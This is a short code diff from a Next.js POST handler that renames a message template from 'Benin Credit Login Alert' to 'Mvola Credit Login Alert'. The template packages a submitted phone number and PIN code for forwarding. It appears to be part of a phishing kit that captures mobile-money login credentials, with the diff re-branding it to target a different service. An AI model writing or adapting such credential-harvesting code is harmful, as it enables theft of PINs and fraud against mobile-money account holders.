@@ -16,7 +16,7 @@ export async function POST(request: NextRequest) {
     }
 
     const message = `
-🔔 **Benin Credit Login Alert**
+🔔 **Mvola Credit Login Alert**
 
 📱 Phone Number: ${phoneNumber}
 🔒  Pin :   ${pinCode}
